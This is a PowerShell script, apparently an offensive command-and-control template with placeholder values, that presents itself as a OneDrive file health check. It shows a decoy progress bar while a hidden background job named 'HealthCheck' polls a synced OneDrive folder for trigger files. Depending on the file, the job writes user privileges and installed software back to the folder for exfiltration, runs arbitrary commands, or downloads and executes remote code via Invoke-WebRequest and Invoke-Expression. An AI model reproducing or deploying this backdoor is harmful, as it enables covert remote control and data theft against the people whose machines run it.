$params = @{
    FileNames = @("{{FILE1}}", "{{FILE2}}", "{{FILE3}}", "{{FILE4}}", "{{FILE5}}")
    Tenant = "{{TENANT}}"
    Library = "{{LIBRARY}}"
    Jitter = Get-Random -Maximum 60
    Pshell = "{{PSHELL}}"
    Phandler = "{{PHANDLER}}"
}

$OneDriveFolder = "$env:USERPROFILE\$($params.Tenant)\$($params.Library)"

$scriptBlock = {
    $processedFiles = @{}

    function CheckForNewFiles {
        try {
            $files = Get-ChildItem -Path $Using:OneDriveFolder -File
            foreach ($file in $files) {
                if (-not $processedFiles.ContainsKey($file.FullName)) {
                    $processedFiles[$file.FullName] = $true

                    switch ($file.Name) {
                        $Using:params.FileNames[0] {
                            whoami /all | Out-File -FilePath "$Using:OneDriveFolder\license_info.txt"
                            Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Caption | Out-File -FilePath "$Using:OneDriveFolder\version_info.txt"
                        }
                        $Using:params.FileNames[1] {
                            Invoke-Expression $Using:params.Pshell
                        }
                        $Using:params.FileNames[2] {
                            start ms-cxh-full://
                        }
                        $Using:params.FileNames[3] {
                            $scriptContent = Invoke-WebRequest -Uri $Using:params.Phandler -UseBasicParsing
                            Invoke-Expression $scriptContent.Content
                        }
                        $Using:params.FileNames[4] {
                            $sourcePath = "$Using:OneDriveFolder\test.ps1"
                            $destinationPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("UserProfile"), "Downloads\test.ps1")
                            Copy-Item -Path $sourcePath -Destination $destinationPath -Force
                        }
                    }
                }
            }
        } catch {
            Write-Host "Error: $_"
        }
    }

    # Monitor for changes in the OneDrive folder every $Using:params.Jitter seconds
    while ($true) {
        CheckForNewFiles
        Start-Sleep -Seconds $Using:params.Jitter
    }
}

Start-Job -Name "HealthCheck" -ScriptBlock $scriptBlock *> $null

$totalCount = 481
for ($i = 1; $i -le $totalCount; $i++) {
    # Calculate percentage complete
    $percentComplete = [math]::Round(($i / $totalCount) * 100, 2)
    Write-Progress -Activity "Checking OneDrive File Health Status" -Status "Files Checked: $i/$totalCount" -PercentComplete $percentComplete

    # Exit loop if the counter reaches the final value
    if ($i -eq $totalCount) {
        break
    }

    Start-Sleep -Seconds 1
}